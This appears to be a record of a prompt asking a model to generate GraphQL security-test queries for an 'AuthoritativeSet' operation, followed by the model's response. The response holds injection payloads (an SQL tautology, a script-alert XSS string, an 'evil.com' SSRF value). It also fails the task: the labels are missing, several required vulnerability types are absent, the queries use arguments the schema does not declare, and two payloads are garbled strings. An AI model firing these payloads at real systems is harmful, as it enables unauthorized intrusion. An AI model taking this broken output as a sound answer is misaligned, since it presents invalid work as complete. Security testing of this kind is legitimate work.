prompt:
You are an expert in GraphQL API security testing.

    Goal: generate valid GraphQL queries for the operation shown, to get successful responses (HTTP 200) quickly while exploring robustness and testing for specific vulnerability types.

    
    CRITICAL REQUIREMENT: You MUST include at least one query for a basic call and EACH of the following vulnerability types:
    - SQL Injection
    - XSS Injection
    - SSRF Injection
    - OS Command Injection
    - Path Injection
    - HTML Injection
    - Query Deny Bypass (REQUIRES TWO QUERIES: non-aliased and aliased)
    - Introspection
    - Field Suggestions

    Strict Requirements:
    1) Queries must be syntactically valid GraphQL.
    2) No placeholders like <id>, "ID!", "value". Use realistic literals or known real values.
    3) You may attempt injected strings, nulls, overlong strings, and type mismatches where appropriate.
    4) You may output 1 query(ies) but MUST cover all vulnerability types listed above.
    5) Do not use the words "edges" or "node".
    6) GraphQL is case-sensitive. Match the exact operation name: AuthoritativeSet.
    7) For each vulnerability type, craft queries that specifically test for that vulnerability pattern.
    8) CRITICAL: Label each query with its vulnerability type using the format: ***<vulnerability_type>*** before each ```graphql block.
    9) SPECIAL CASE: For Query Deny Bypass, you MUST generate TWO queries:
        - First query: Non-aliased version (normal query structure)
        - Second query: Aliased version (using query aliases like "s: queryName")
        Both queries should test the same operation but with different structures to test access control bypass.
    
    SCHEMA (authoritative):
    - schema types: {'AuthoritativeSet': {'kind': 'OBJECT', 'fields': [{'name': 'id', 'type': 'String!'}, {'name': 'type', 'type': 'String!'}, {'name': 'identifier', 'type': 'String'}, {'name': 'name', 'type': 'String'}, {'name': 'description', 'type': 'String'}, {'name': 'itemCount', 'type': 'Int!'}, {'name': 'authorities', 'type': 'historicalAgents'}, {'name': 'links', 'type': '[Link]'}, {'name': 'annotations', 'type': '[Annotation]'}, {'name': 'systemEvents', 'type': '[SystemEvent]'}]}, 'historicalAgents': {'kind': 'OBJECT', 'fields': [{'name': 'items', 'type': '[HistoricalAgent]'}, {'name': 'edges', 'type': '[HistoricalAgentEdge]'}, {'name': 'pageInfo', 'type': 'pageInfoHistoricalAgent'}]}, 'HistoricalAgent': {'kind': 'OBJECT', 'fields': [{'name': 'id', 'type': 'String!'}, {'name': 'type', 'type': 'String!'}, {'name': 'identifier', 'type': 'String'}, {'name': 'description', 'type': 'HistoricalAgentDescription'}, {'name': 'descriptions', 'type': '[HistoricalAgentDescription]'}, {'name': 'links', 'type': '[Link]'}, {'name': 'annotations', 'type': '[Annotation]'}, {'name': 'connected', 'type': '[Relationship]'}, {'name': 'related', 'type': '[Relationship]'}, {'name': 'systemEvents', 'type': '[SystemEvent]'}]}, 'HistoricalAgentDescription': {'kind': 'OBJECT', 'fields': [{'name': 'languageCode', 'type': 'String'}, {'name': 'name', 'type': 'String'}, {'name': 'identifier', 'type': 'String'}, {'name': 'accessPoints', 'type': '[AccessPoint]'}, {'name': 'dates', 'type': '[DatePeriod]'}, {'name': 'lastName', 'type': 'String'}, {'name': 'firstName', 'type': 'String'}, {'name': 'source', 'type': 'String'}, {'name': 'typeOfEntity', 'type': 'String'}, {'name': 'datesOfExistence', 'type': 'String'}, {'name': 'biographicalHistory', 'type': 'String'}, {'name': 'legalStatus', 'type': 'String'}, {'name': 'structure', 'type': 'String'}, {'name': 'generalContext', 'type': 'String'}, {'name': 'occupation', 'type': 'String'}, {'name': 'otherFormsOfName', 'type': '[String]'}, {'name': 'parallelFormsOfName', 'type': '[String]'}, {'name': 'place', 'type': '[String]'}, {'name': 'functions', 'type': '[String]'}, {'name': 'mandates', 'type': '[String]'}, {'name': 'scripts', 'type': '[String]'}, {'name': 'sources', 'type': '[String]'}]}, 'AccessPoint': {'kind': 'OBJECT', 'fields': [{'name': 'id', 'type': 'String!'}, {'name': 'name', 'type': 'String'}, {'name': 'type', 'type': 'AccessPointType!'}]}, 'DatePeriod': {'kind': 'OBJECT', 'fields': [{'name': 'startDate', 'type': 'String'}, {'name': 'endDate', 'type': 'String'}]}, 'Link': {'kind': 'OBJECT', 'fields': [{'name': 'id', 'type': 'String!'}, {'name': 'type', 'type': 'String!'}, {'name': 'description', 'type': 'String'}, {'name': 'field', 'type': 'String'}, {'name': 'targets', 'type': '[Linkable]'}, {'name': 'source', 'type': 'Linkable'}, {'name': 'body', 'type': '[AccessPoint]'}, {'name': 'linkType', 'type': 'LinkType!'}, {'name': 'annotations', 'type': '[Annotation]'}, {'name': 'dates', 'type': '[DatePeriod]'}, {'name': 'systemEvents', 'type': '[SystemEvent]'}]}, 'Annotation': {'kind': 'OBJECT', 'fields': [{'name': 'id', 'type': 'String!'}, {'name': 'type', 'type': 'String!'}, {'name': 'body', 'type': 'String'}, {'name': 'field', 'type': 'String'}, {'name': 'annotationType', 'type': 'String'}, {'name': 'by', 'type': 'String'}, {'name': 'targets', 'type': '[Annotatable]'}, {'name': 'annotations', 'type': '[Annotation]'}, {'name': 'systemEvents', 'type': '[SystemEvent]'}]}, 'SystemEvent': {'kind': 'OBJECT', 'fields': [{'name': 'timestamp', 'type': 'String'}, {'name': 'logMessage', 'type': 'String'}, {'name': 'eventType', 'type': 'String'}]}, 'Relationship': {'kind': 'OBJECT', 'fields': [{'name': 'context', 'type': 'Link'}, {'name': 'item', 'type': 'Linkable'}]}, 'HistoricalAgentEdge': {'kind': 'OBJECT', 'fields': [{'name': 'node', 'type': 'HistoricalAgent'}, {'name': 'cursor', 'type': 'Cursor'}]}, 'pageInfoHistoricalAgent': {'kind': 'OBJECT', 'fields': [{'name': 'hasPreviousPage', 'type': 'Boolean'}, {'name': 'previousPage', 'type': 'Cursor'}, {'name': 'hasNextPage', 'type': 'Boolean'}, {'name': 'nextPage', 'type': 'Cursor'}]}}
    - output fields (if known): AuthoritativeSet
    Use only fields/args compatible with this schema.
    
    Context:
    - operation: AuthoritativeSet
    - input (declared): AuthoritativeSet, input: {'id': 'ID!'}
    - node type: query
    
    Output format:
    Each query must be in its own fenced block with a vulnerability type label:
    Vulnerability Type Labels Are:
    - SQL_Injection
    - XSS_Injection
    - SSRF_Injection
    - OS_Command_Injection
    - Path_Injection
    - HTML_Injection
    - Query_Deny_Bypass_Non_Aliased
    - Query_Deny_Bypass_Aliased
    - Introspection
    - Field_Suggestions
    - Basic_Call

    ***<Vulnerability Type>***
    ```graphql
    <your query>
    ```
    
    Example:
    ***SQL_Injection***
    ```graphql
    query {
      users(filter: "1' OR '1'='1") {
        id
        name
      }
    }
    ```
    
    ***XSS_Injection***
    ```graphql
    query {
      search(term: "<script>alert('xss')</script>") {
        results
      }
    }
    ```
llm_response:
``` Please note that each query helps to exploit the associated vulnerability. Vulnerability Types related to SQL Injection, OS Command Injection, Path Injection, and SSRF Injection typically bypass the server-side validation as the input data directly affects the server's data structures or input validation. For XSS Injection, attacks aim at deceiving the user into executing malicious scripts via malicious HTML. Here, we are attempting to harm the application by including malicious HTML into the 'name' field of the query. For HTML Injection, attacks proceed by injecting HTML tags in order to manipulate the layout of the page. This can lead to unspecified issues due to varied server-side logic. Note that these tests should only be performed in a controlled environment with authorized access for testing, so as not to cause unintended damage to other users. P.S. query.query:
query {
  AuthoritativeSet(id: " valid ID") {
    id
    type
    identifier
    name
    description
    itemCount
    authorities
    links
    annotations
    systemEvents
  }
}

query {
  AuthoritativeSet(id: "1' OR 1=1") {
    id
    type
    identifier
    name
    description
    itemCount
    authorities
    links
    annotations
    systemEvents
  }
}

query {
  AuthoritativeSet(name: "<script>alert('xss')</script>") {
    id
    type
    identifier
    name
    description
    itemCount
    authorities
    links
    annotations
    systemEvents
  }
}

query {
  AuthoritativeSet(links: ["http://evil.com"]) {
    id
    type
    identifier
    name
    description
    itemCount
    authorities
    links
    annotations
    systemEvents
  }
}

query {
  AuthoritativeSet(annotations: ["&_%26class,%20Foundation%20who%20upsidedown%20wouldn't"]) {
    id
    type
    identifier
    name
    description
    itemCount
    authorities
    links
    annotations
    systemEvents
  }
}

query {
  AuthoritativeSet(links: [" NaN.v+c+b ;"] ) {
    id
    type
    identifier
    name
    description
    itemCount
    authorities
    links
    annotations
    systemEvents
  }
}
